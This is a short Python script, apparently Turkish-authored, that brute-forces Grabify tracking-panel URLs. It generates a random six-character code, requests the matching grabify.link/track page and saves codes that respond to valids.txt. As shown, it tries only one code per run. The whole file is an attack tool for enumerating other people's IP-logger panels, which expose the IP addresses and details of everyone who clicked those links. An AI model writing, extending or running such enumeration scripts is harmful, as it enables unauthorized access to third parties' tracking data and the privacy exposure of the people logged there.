import requests
import random

print('*** Welcome to Grabify Track Panel Bruter ***')
print('*** Please be patient, valid links will be saved and shown ***')

def generate_random_string(length):
    characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    return ''.join(random.choice(characters) for _ in range(length))

def sik(url):
    response = requests.get('https://grabify.link/track/' + url)
    if response.status_code == 200:
        print(f'https://grabify.link/track/{url} - açık')
        with open('valids.txt', 'a') as yaz:
            yaz.write(f'https://grabify.link/track/{url} - açık\n')
    else:
        print(f'https://grabify.link/track/{url} - kapalı')

random_string = generate_random_string(6)
sik(random_string)